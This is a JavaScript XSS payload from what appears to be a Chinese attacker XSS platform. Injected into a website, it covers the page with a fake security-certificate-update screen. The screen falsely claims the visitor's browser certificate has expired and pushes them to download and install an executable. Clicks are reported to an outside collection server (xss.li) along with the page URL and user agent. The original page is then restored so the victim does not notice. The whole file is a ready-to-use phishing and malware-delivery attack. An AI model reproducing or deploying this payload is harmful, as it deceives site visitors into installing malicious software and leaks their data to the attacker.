// 钓鱼证书下载Payload - 黑客仓库XSS平台
// 伪造系统更新/证书下载页面诱导用户下载恶意文件

(function() {
    'use strict';
    
    var config = {
        serverUrl: 'https://xss.li/api/collect.php',
        downloadUrl: 'https://example.com/update.exe', // 替换为实际文件URL
        certName: '安全证书更新.exe'
    };
    
    console.log('🎣 黑客仓库XSS - 钓鱼下载模块');
    
    // 创建钓鱼页面
    function createPhishingPage() {
        // 保存原始内容
        var originalContent = document.body.innerHTML;
        
        // 创建钓鱼界面
        document.body.innerHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f5f5f5; z-index: 999999; font-family: 'Microsoft YaHei', Arial, sans-serif;">
                <div style="max-width: 600px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                    <div style="text-align: center; margin-bottom: 30px;">
                        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="2">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                            <path d="M9 12l2 2 4-4"></path>
                        </svg>
                        <h2 style="color: #333; margin-top: 20px;">安全证书更新</h2>
                    </div>
                    
                    <div style="background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 4px; margin-bottom: 20px;">
                        <p style="margin: 0; color: #856404;">
                            ⚠️ 检测到您的浏览器安全证书已过期，为了保护您的账户安全，请立即更新证书。
                        </p>
                    </div>
                    
                    <div style="margin-bottom: 20px;">
                        <p style="color: #666; line-height: 1.6;">
                            证书更新包括：<br>
                            • SSL/TLS 安全连接证书<br>
                            • 数字签名验证证书<br>
                            • 身份认证证书<br>
                        </p>
                    </div>
                    
                    <button id="downloadBtn" style="width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; transition: all 0.3s;">
                        🔒 立即下载并安装证书
                    </button>
                    
                    <p style="text-align: center; color: #999; font-size: 12px; margin-top: 20px;">
                        此更新由系统安全中心提供
                    </p>
                </div>
            </div>
        `;
        
        // 绑定下载事件
        document.getElementById('downloadBtn').addEventListener('click', function() {
            this.textContent = '⏳ 正在准备下载...';
            this.style.background = '#666';
            
            // 记录点击事件
            recordClick();
            
            // 触发下载
            setTimeout(function() {
                var link = document.createElement('a');
                link.href = config.downloadUrl;
                link.download = config.certName;
                link.click();
                
                // 延迟恢复页面
                setTimeout(function() {
                    document.body.innerHTML = originalContent;
                }, 2000);
            }, 1000);
        });
    }
    
    // 记录用户点击
    async function recordClick() {
        try {
            await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    type: 'phishing_download',
                    action: 'download_clicked',
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            });
            console.log('📊 点击事件已记录');
        } catch (error) {
            console.error('记录失败:', error);
        }
    }
    
    // 延迟1秒后显示钓鱼页面
    setTimeout(createPhishingPage, 1000);
    
})();
